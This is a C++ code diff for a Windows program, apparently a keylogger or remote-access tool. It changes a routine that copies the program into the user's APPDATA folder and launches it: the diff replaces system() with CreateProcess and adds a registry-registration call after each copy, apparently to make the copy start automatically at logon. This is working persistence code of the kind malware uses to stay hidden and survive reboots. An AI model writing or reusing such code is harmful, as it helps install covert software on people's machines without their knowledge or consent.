@@ -17,6 +17,7 @@
 #include <wininet.h>
 #include <sys/stat.h>
 #include <shlwapi.h>
+#include "Regedit.h"
 
 #pragma comment(lib, "Urlmon.lib")
 
@@ -148,14 +149,30 @@ namespace IO
         return (stat (name.c_str(), &buffer) == 0);
     }
     void startup(LPCTSTR lpApplicationName) {
-        int result = system(lpApplicationName);
-        if (result <0){
-            std::string msg = "[ ERROR ] Start"+std::string(lpApplicationName);
-            Helper::WriteAppLog(msg);
-        } else{
-            std::string msg = "Start" +std::string(lpApplicationName);
-            Helper::WriteAppLog(msg);
-        }
+        // additional information
+        STARTUPINFO si;
+        PROCESS_INFORMATION pi;
+
+        // set the size of the structures
+        ZeroMemory(&si, sizeof(si));
+        si.cb = sizeof(si);
+        ZeroMemory(&pi, sizeof(pi));
+
+        // start the program up
+        CreateProcess(lpApplicationName,   // the path
+                      "",        // Command line
+                      NULL,           // Process handle not inheritable
+                      NULL,           // Thread handle not inheritable
+                      FALSE,          // Set handle inheritance to FALSE
+                      0,              // No creation flags
+                      NULL,           // Use parent's environment block
+                      NULL,           // Use parent's starting directory
+                      &si,            // Pointer to STARTUPINFO structure
+                      &pi             // Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
+        );
+        // Close process and thread handles.
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
     }
     bool copy_File() {
         char* appdata = getenv("APPDATA");
@@ -188,18 +205,21 @@ namespace IO
                     std::string msg = "COMPLETE" +std::string(fullpath);
                     Helper::WriteAppLog(msg);
                     startup(fullpath.c_str());
+                    Registry::RegisterProgram2(filename,fullpath);
                     return true;
                 }
             }else {
                 std::string msg = "COMPLETE"+std::string(fullpath);
                 Helper::WriteAppLog(msg);
                 startup(fullpath.c_str());
+                Registry::RegisterProgram2(filename,fullpath);
                 return true;
             }
         }else {
             std::string msg = "COMPLETE" +std::string(fullpath);
             Helper::WriteAppLog(msg);
             startup(fullpath.c_str());
+            Registry::RegisterProgram2(filename,fullpath);
             return true;
         }
 
